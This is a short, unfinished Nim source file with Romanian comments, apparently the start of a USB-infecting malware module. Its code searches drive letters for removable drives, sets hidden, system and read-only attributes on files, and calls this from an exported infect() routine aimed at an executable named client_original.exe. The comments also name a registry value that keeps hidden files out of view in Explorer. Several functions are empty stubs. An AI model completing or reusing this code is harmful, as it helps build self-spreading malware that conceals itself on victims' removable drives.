## aici o sa fac o func cu care infectez usburi
## 
## o sa am nev de asta
## key: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced
## value: Hidden = 2
## 
## ca sa nu se vada fisierele ascunse puse pe drive
## 
## TODO: termina asta

from bitops import bitor
import winim


proc createFile(): void =
  discard

proc setAttributes(attr: DWORD): DWORD =
  result = bitor(attr, FILE_ATTRIBUTE_READONLY)
  result = bitor(result, FILE_ATTRIBUTE_HIDDEN)
  result = bitor(result, FILE_ATTRIBUTE_NOT_CONTENT_INDEXED)
  result = bitor(result, FILE_ATTRIBUTE_NOT_CONTENT_INDEXED)
  result = bitor(result, FILE_ATTRIBUTE_SYSTEM)

proc hideFile(path: string): void =
  let attr: DWORD = GetFileAttributes(path)

  let newAttr: DWORD = setAttributes(attr)

  SetFileAttributes(path, newAttr)

proc searchForUSB(): void =
  for c in "DEFGHIJKLMNOPQRSTUVWXYZ":
    let drivePath: string = c & r":\"
    let driveType: UINT = GetDriveTypeW(drivePath)

    if driveType == DRIVE_REMOVABLE:
      echo "am gasit"


proc checkDrive(drivePath: string): void =
  discard

proc infect*(): void =
  searchForUSB()
  hideFile(r"C:\Users\vieru\Documents\scheme_noi\dist\client_original.exe")
